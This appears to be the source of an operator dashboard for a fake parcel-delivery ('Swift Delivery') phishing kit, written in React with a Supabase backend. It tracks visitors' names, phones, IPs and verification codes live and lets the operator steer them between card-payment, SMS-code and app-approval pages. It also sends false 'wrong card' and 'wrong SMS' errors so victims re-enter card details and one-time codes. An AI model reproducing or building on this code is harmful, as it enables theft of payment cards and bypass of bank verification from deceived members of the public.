import { useEffect, useState, useMemo } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { 
  RefreshCw, 
  Users,
  LogOut,
  Settings,
  Search,
  X,
  CheckSquare,
  Square,
  Trash2,
  Send,
  CreditCard,
  MessageSquare,
  Package,
  CheckCircle,
  AlertTriangle,
  LayoutGrid,
  List
} from "lucide-react";
import { toast } from "@/hooks/use-toast";
import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
import AdminLogin from "@/components/AdminLogin";
import AdminSettings from "@/components/AdminSettings";
import { ClientCard } from "@/components/admin/ClientCard";
import { ClientRow } from "@/components/admin/ClientRow";

interface ClientSession {
  id: string;
  session_code: string;
  client_name: string | null;
  phone_number: string | null;
  current_step: number;
  parcel_tracking: string | null;
  amount: number | null;
  status: string | null;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  approval_type: string | null;
  client_ip: string | null;
  origin: string | null;
  destination: string | null;
  estimated_delivery: string | null;
  created_at: string;
  updated_at: string;
}

// Define which actions are destructive and need confirmation
const destructiveActions: Record<string, { title: string; description: string }> = {
  deactivate: {
    title: "Deactivate Clients",
    description: "This will remove these clients from the active list. They will no longer appear in the panel."
  },
  wrong_card: {
    title: "Send Wrong Card Alert",
    description: "This will send all selected clients back to the payment page with an error message."
  },
  confirm: {
    title: "Confirm All Payments",
    description: "This will mark all selected client payments as confirmed and complete their sessions."
  }
};

const AdminPanel = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [sessions, setSessions] = useState<ClientSession[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [bulkAction, setBulkAction] = useState("");
  const [viewMode, setViewMode] = useState<"list" | "grid">("list");
  const [confirmDialog, setConfirmDialog] = useState<{
    open: boolean;
    action: string;
    title: string;
    description: string;
  }>({ open: false, action: "", title: "", description: "" });

  // Filter sessions based on search query
  const filteredSessions = useMemo(() => {
    if (!searchQuery.trim()) return sessions;
    
    const query = searchQuery.toLowerCase().trim();
    return sessions.filter(session => 
      session.session_code?.toLowerCase().includes(query) ||
      session.client_name?.toLowerCase().includes(query) ||
      session.client_ip?.toLowerCase().includes(query) ||
      session.phone_number?.toLowerCase().includes(query)
    );
  }, [sessions, searchQuery]);

  const allSelected = filteredSessions.length > 0 && filteredSessions.every(s => selectedIds.has(s.id));
  const someSelected = selectedIds.size > 0;

  const toggleSelectAll = () => {
    if (allSelected) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(new Set(filteredSessions.map(s => s.id)));
    }
  };

  const toggleSelect = (id: string) => {
    const newSelected = new Set(selectedIds);
    if (newSelected.has(id)) {
      newSelected.delete(id);
    } else {
      newSelected.add(id);
    }
    setSelectedIds(newSelected);
  };

  const handleBulkAction = () => {
    if (!bulkAction || selectedIds.size === 0) return;
    
    // Check if action needs confirmation
    if (destructiveActions[bulkAction]) {
      setConfirmDialog({
        open: true,
        action: bulkAction,
        title: destructiveActions[bulkAction].title,
        description: `${destructiveActions[bulkAction].description} This will affect ${selectedIds.size} client${selectedIds.size > 1 ? 's' : ''}.`
      });
    } else {
      executeBulkAction(bulkAction);
    }
  };

  const executeBulkAction = async (action: string) => {
    if (!action || selectedIds.size === 0) return;

    const ids = Array.from(selectedIds);
    
    try {
      switch (action) {
        case "step1":
        case "step2":
        case "step3":
        case "step4": {
          const step = parseInt(action.replace("step", ""));
          await supabase
            .from("client_sessions")
            .update({ current_step: step, approval_type: step === 2 ? null : undefined })
            .in("id", ids);
          toast({ title: `${ids.length} clients sent to step ${step}` });
          break;
        }
        case "sms":
          await supabase
            .from("client_sessions")
            .update({ current_step: 3, approval_type: null, verification_code: null })
            .in("id", ids);
          toast({ title: `${ids.length} clients sent to SMS verification` });
          break;
        case "app":
          await supabase
            .from("client_sessions")
            .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
            .in("id", ids);
          toast({ title: `${ids.length} clients sent to App approval` });
          break;
        case "wrong_card":
          await supabase
            .from("client_sessions")
            .update({ 
              current_step: 2,
              admin_message: "The card details you entered are incorrect. Please check and try again.",
              message_type: "error"
            })
            .in("id", ids);
          toast({ title: `${ids.length} clients sent back to card page` });
          break;
        case "wrong_sms":
          await supabase
            .from("client_sessions")
            .update({ 
              admin_message: "The verification code you entered is incorrect. Please check and try again.",
              message_type: "error"
            })
            .in("id", ids);
          toast({ title: `Wrong SMS alert sent to ${ids.length} clients` });
          break;
        case "confirm":
          await supabase
            .from("client_sessions")
            .update({ current_step: 4, approval_type: "sms" })
            .in("id", ids);
          toast({ title: `${ids.length} payments confirmed` });
          break;
        case "deactivate":
          await supabase
            .from("client_sessions")
            .update({ status: "completed" })
            .in("id", ids);
          toast({ title: `${ids.length} clients deactivated` });
          break;
        case "clear_message":
          await supabase
            .from("client_sessions")
            .update({ admin_message: null, message_type: null })
            .in("id", ids);
          toast({ title: `Messages cleared for ${ids.length} clients` });
          break;
      }
      
      setSelectedIds(new Set());
      setBulkAction("");
    } catch (error) {
      console.error("Bulk action error:", error);
      toast({ title: "Error", description: "Failed to execute bulk action", variant: "destructive" });
    }
  };

  const handleConfirmAction = () => {
    executeBulkAction(confirmDialog.action);
    setConfirmDialog({ open: false, action: "", title: "", description: "" });
  };

  // Check for existing admin session
  useEffect(() => {
    const adminAuth = sessionStorage.getItem("admin_authenticated");
    if (adminAuth === "true") {
      setIsAuthenticated(true);
    }
  }, []);

  const handleLogout = () => {
    sessionStorage.removeItem("admin_authenticated");
    sessionStorage.removeItem("admin_username");
    setIsAuthenticated(false);
    toast({
      title: "Logged out",
      description: "You have been logged out of the admin panel",
    });
  };

  const fetchSessions = async () => {
    const { data, error } = await supabase
      .from("client_sessions")
      .select("*")
      .eq("status", "active")
      .order("created_at", { ascending: false });

    if (error) {
      console.error("Error fetching sessions:", error);
      toast({
        title: "Error",
        description: "Failed to fetch client sessions",
        variant: "destructive"
      });
    } else {
      setSessions(data || []);
    }
    setLoading(false);
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchSessions();

      // Subscribe to realtime changes
      const channel = supabase
        .channel("client_sessions_changes")
        .on(
          "postgres_changes",
          {
            event: "*",
            schema: "public",
            table: "client_sessions"
          },
          () => {
            fetchSessions();
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    }
  }, [isAuthenticated]);

  if (!isAuthenticated) {
    return <AdminLogin onLogin={() => setIsAuthenticated(true)} />;
  }

  return (
    <>
      {/* Confirmation Dialog */}
      <AlertDialog open={confirmDialog.open} onOpenChange={(open) => !open && setConfirmDialog({ ...confirmDialog, open: false })}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle className="flex items-center gap-2">
              <AlertTriangle className="w-5 h-5 text-destructive" />
              {confirmDialog.title}
            </AlertDialogTitle>
            <AlertDialogDescription>
              {confirmDialog.description}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Cancel</AlertDialogCancel>
            <AlertDialogAction
              onClick={handleConfirmAction}
              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
            >
              Confirm
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-secondary text-secondary-foreground py-4 shadow-lg">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img 
                src={swiftDeliveryLogo} 
                alt="Swift Delivery" 
                className="h-8 object-contain"
              />
              <div>
                <h1 className="text-xl font-semibold">Admin Panel</h1>
                <p className="text-sm text-secondary-foreground/70">Client Control Dashboard</p>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2 text-sm">
                <Users className="w-4 h-4" />
                <span>{sessions.length} active</span>
              </div>
              <Button 
                variant="outline" 
                size="sm" 
                onClick={fetchSessions}
                className="gap-2"
              >
                <RefreshCw className="w-4 h-4" />
                Refresh
              </Button>
              <Button 
                variant="ghost" 
                size="sm" 
                onClick={handleLogout}
                className="gap-2"
              >
                <LogOut className="w-4 h-4" />
                Logout
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <Tabs defaultValue="clients" className="space-y-6">
          <TabsList className="grid w-full max-w-md grid-cols-2">
            <TabsTrigger value="clients" className="gap-2">
              <Users className="w-4 h-4" />
              Clients
            </TabsTrigger>
            <TabsTrigger value="settings" className="gap-2">
              <Settings className="w-4 h-4" />
              Settings
            </TabsTrigger>
          </TabsList>

          <TabsContent value="clients">
            {/* Search Bar & Bulk Actions */}
            <div className="flex flex-col sm:flex-row gap-4 mb-4">
              <div className="relative flex-1 max-w-md">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                <Input
                  placeholder="Search by IP, name, session code, or phone..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pl-9 pr-9"
                />
                {searchQuery && (
                  <button 
                    onClick={() => setSearchQuery("")}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground"
                  >
                    <X className="w-4 h-4" />
                  </button>
                )}
              </div>

            {/* View Toggle & Bulk Actions Bar */}
              {filteredSessions.length > 0 && (
                <div className="flex items-center gap-2 flex-wrap">
                  {/* View Toggle */}
                  <div className="flex border rounded-md">
                    <Button
                      variant={viewMode === "list" ? "secondary" : "ghost"}
                      size="sm"
                      onClick={() => setViewMode("list")}
                      className="rounded-r-none h-9 px-2"
                    >
                      <List className="w-4 h-4" />
                    </Button>
                    <Button
                      variant={viewMode === "grid" ? "secondary" : "ghost"}
                      size="sm"
                      onClick={() => setViewMode("grid")}
                      className="rounded-l-none h-9 px-2"
                    >
                      <LayoutGrid className="w-4 h-4" />
                    </Button>
                  </div>

                  <Button
                    variant="outline"
                    size="sm"
                    onClick={toggleSelectAll}
                    className="gap-2"
                  >
                    {allSelected ? (
                      <CheckSquare className="w-4 h-4" />
                    ) : (
                      <Square className="w-4 h-4" />
                    )}
                    {allSelected ? "Deselect" : "Select All"}
                  </Button>
                  
                  {someSelected && (
                    <>
                      <span className="text-sm text-muted-foreground">
                        {selectedIds.size} selected
                      </span>
                      <Select value={bulkAction} onValueChange={setBulkAction}>
                        <SelectTrigger className="w-[180px] h-9">
                          <SelectValue placeholder="Bulk action..." />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="step1">
                            <span className="flex items-center gap-2">
                              <Package className="w-4 h-4" /> → Parcel Details
                            </span>
                          </SelectItem>
                          <SelectItem value="step2">
                            <span className="flex items-center gap-2">
                              <CreditCard className="w-4 h-4" /> → Payment
                            </span>
                          </SelectItem>
                          <SelectItem value="sms">
                            <span className="flex items-center gap-2">
                              <MessageSquare className="w-4 h-4" /> → SMS Verify
                            </span>
                          </SelectItem>
                          <SelectItem value="app">
                            <span className="flex items-center gap-2">
                              <MessageSquare className="w-4 h-4" /> → App Approval
                            </span>
                          </SelectItem>
                          <SelectItem value="wrong_card">
                            <span className="flex items-center gap-2">
                              <CreditCard className="w-4 h-4 text-destructive" /> Wrong Card
                            </span>
                          </SelectItem>
                          <SelectItem value="wrong_sms">
                            <span className="flex items-center gap-2">
                              <MessageSquare className="w-4 h-4 text-destructive" /> Wrong SMS
                            </span>
                          </SelectItem>
                          <SelectItem value="confirm">
                            <span className="flex items-center gap-2">
                              <CheckCircle className="w-4 h-4 text-green-500" /> Confirm Payment
                            </span>
                          </SelectItem>
                          <SelectItem value="clear_message">
                            <span className="flex items-center gap-2">
                              <X className="w-4 h-4" /> Clear Messages
                            </span>
                          </SelectItem>
                          <SelectItem value="deactivate">
                            <span className="flex items-center gap-2">
                              <Trash2 className="w-4 h-4 text-destructive" /> Deactivate
                            </span>
                          </SelectItem>
                        </SelectContent>
                      </Select>
                      <Button
                        size="sm"
                        onClick={handleBulkAction}
                        disabled={!bulkAction}
                        className="gap-2"
                      >
                        <Send className="w-4 h-4" />
                        Apply
                      </Button>
                    </>
                  )}
                </div>
              )}
            </div>

            {loading ? (
              <div className="flex items-center justify-center py-20">
                <RefreshCw className="w-8 h-8 animate-spin text-muted-foreground" />
              </div>
            ) : sessions.length === 0 ? (
              <Card className="text-center py-20">
                <CardContent>
                  <Users className="w-16 h-16 mx-auto text-muted-foreground mb-4" />
                  <h2 className="text-xl font-semibold mb-2">No Active Clients</h2>
                  <p className="text-muted-foreground">
                    When clients start the payment flow, they will appear here.
                  </p>
                </CardContent>
              </Card>
            ) : filteredSessions.length === 0 ? (
              <Card className="text-center py-12">
                <CardContent>
                  <Search className="w-12 h-12 mx-auto text-muted-foreground mb-4" />
                  <h2 className="text-lg font-semibold mb-2">No Results Found</h2>
                  <p className="text-muted-foreground text-sm">
                    No clients match "{searchQuery}"
                  </p>
                </CardContent>
              </Card>
            ) : viewMode === "list" ? (
              <Card className="overflow-hidden">
                <div className="divide-y">
                  {filteredSessions.map((session) => (
                    <ClientRow 
                      key={session.id} 
                      session={session} 
                      isSelected={selectedIds.has(session.id)}
                      onToggleSelect={() => toggleSelect(session.id)}
                    />
                  ))}
                </div>
              </Card>
            ) : (
              <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
                {filteredSessions.map((session) => (
                  <ClientCard 
                    key={session.id} 
                    session={session} 
                    isSelected={selectedIds.has(session.id)}
                    onToggleSelect={() => toggleSelect(session.id)}
                  />
                ))}
              </div>
            )}
          </TabsContent>

          <TabsContent value="settings">
            <AdminSettings />
          </TabsContent>
        </Tabs>
      </main>
      </div>
    </>
  );
};

export default AdminPanel;
